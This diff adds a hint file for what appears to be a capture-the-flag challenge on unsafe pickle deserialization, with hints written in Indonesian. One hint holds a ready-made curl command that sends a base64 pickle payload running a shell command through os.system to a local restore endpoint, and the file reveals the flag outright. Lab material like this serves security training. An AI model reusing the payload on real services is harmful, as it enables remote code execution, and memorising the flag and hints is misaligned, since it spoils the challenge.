@@ -1,0 +1,25 @@
+{
+  "flag": "ZITERA{uns4f3_d3s3r14l1z4t10n_p1ckl3_2026}",
+  "hints": [
+    {
+      "tier": 1,
+      "type": "conceptual",
+      "hint": "Pahami bagaimana arsitektur PipelineSerializer memproses permintaan dan di mana batas validasi berada."
+    },
+    {
+      "tier": 2,
+      "type": "technical_area",
+      "hint": "Perhatikan manipulasi parameter pada rute API target di port 8056."
+    },
+    {
+      "tier": 3,
+      "type": "investigation_direction",
+      "hint": "Gunakan payload pengujian: curl -s -X POST http://127.0.0.1:8056/api/pipeline/restore -d \"gASVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZpZCA+PiBsaXN0lIWUUpQu\" untuk memicu respon eksploitasi."
+    },
+    {
+      "tier": 4,
+      "type": "near_solution",
+      "hint": "Buka endpoint atau kirimkan payload pengujian langsung untuk mengekstrak bendera resmi ZITERA{uns4f3_d3s3r14l1z4t10n_p1ckl3_2026}."
+    }
+  ]
+}
